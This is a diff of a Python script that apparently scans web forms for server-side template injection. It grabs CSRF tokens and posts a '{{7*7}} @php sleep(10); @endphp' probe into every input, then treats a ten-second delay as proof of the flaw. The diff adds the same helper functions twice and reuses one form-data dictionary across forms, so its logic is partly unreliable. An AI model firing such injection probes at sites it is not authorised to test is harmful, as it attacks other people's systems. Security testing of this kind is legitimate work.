@@ -74,6 +74,44 @@ def filter_links(all_urls):
     return all_urls
 
 
+def post_url(html):
+    """
+    This function finds all form action links in a page, and returns only the required form action links
+    """
+    post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]
+    #formatted_links = []
+
+    #for link in post_links:
+    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
+    #formatted_links.append(formatted_link[0])
+
+    return formatted_link
+
+
+def get_token(html):
+    """
+    This function grabs the token for each given form
+    """
+    token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
+    return token
+
+
+def get_forms(html):
+    """
+    This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
+    and pair them together.
+    """
+    form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s'\\\\]+</form>)+", html)
+
+    link_groups = {}
+    for group in form_groups:
+        action_link = post_url(group)
+        input_links = locate_input_points(group)
+        link_groups[action_link] = input_links
+
+    return link_groups
+
+
 def locate_input_points(html):
     """
     Finds all text input tags and returns their names
@@ -102,18 +140,42 @@ def locate_input_points(html):
 
     return final_names
 
-def post_urls(html):
+def post_url(html):
     """
     This function finds all form action links in a page, and returns only the required form action links
     """
-    post_links = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)
-    formatted_links = []
+    post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]
+    #formatted_links = []
 
-    for link in post_links:
-        formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", link)
-        formatted_links.append(formatted_link[0])
+    #for link in post_links:
+    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
+    #formatted_links.append(formatted_link[0])
 
-    return formatted_links
+    return formatted_link
+
+
+def get_token(html):
+    """
+    This function grabs the token for each given form
+    """
+    token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
+    return token
+
+
+def get_forms(html):
+    """
+    This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
+    and pair them together.
+    """
+    form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s'\\\\]+</form>)+", html)
+
+    link_groups = {}
+    for group in form_groups:
+        action_link = post_url(group)
+        input_links = locate_input_points(group)
+        link_groups[action_link] = input_links
+
+    return link_groups
 
 
 def test_stored_immediate(urls):
@@ -128,30 +190,35 @@ def test_stored_immediate(urls):
         front = session.get(url)
 
         try:
-            token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', front.text)[0]
+            token = get_token(front.text)
             cookies = session.cookies
 
-            inputs = locate_input_points(front.text)
-            p_urls = post_urls(front.text)
+            post_data = {}
+            groups = get_forms(front.text)
 
-            for post_url in p_urls:
-                for name in inputs:
-                    data = {name: "{{7*7}} @php sleep(10); @endphp", "_token": token}
-                    start = time.time()
-                    req = requests.post(post_url, data=data, cookies=cookies)
-                    end = time.time()
+            for group in groups:
+                # Get the inputs for each form group iteratively
+                inputs = groups[group]
 
-                    # If it's visible, we consider that this is reflected injection and not stored immediate injection
-                    if("49" in req.text):
-                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: False")
-                        continue
+                for inp in inputs:  # Give each input a value and add to dictionary
+                    post_data[inp] = group + " {{7*7}} " + "@php sleep(10); @endphp"
 
-                    # Request took 10 or more seconds, therefore we can deduce that SSTI was successful
-                    if(end-start >= 10):
-                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: True")
-                    else:
-                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: False")
-        except:
+                post_data["_token"] = token  # Add token last
+                start = time.time()
+                req = requests.post(group, data=post_data, cookies=cookies)
+                end = time.time()
+
+                # If it's visible, we consider that this is reflected injection and not stored immediate injection
+                if("49" in req.text):
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: False")
+                    continue
+
+                # Request took 10 or more seconds, therefore we can deduce that SSTI was successful
+                if(end-start >= 10):
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: True")
+                else:
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: False")
+        except IndexError:
             scan_result.append("URL: " + url + " isVulnerable: Unable to test, no input points found")
             continue
 
@@ -177,4 +244,4 @@ filtered_urls = filter_links(urls+nested_links)
 stored_imm_results = test_stored_immediate(filtered_urls)
 
 for result in stored_imm_results:  # print results
-   print(result)
+    print(result)
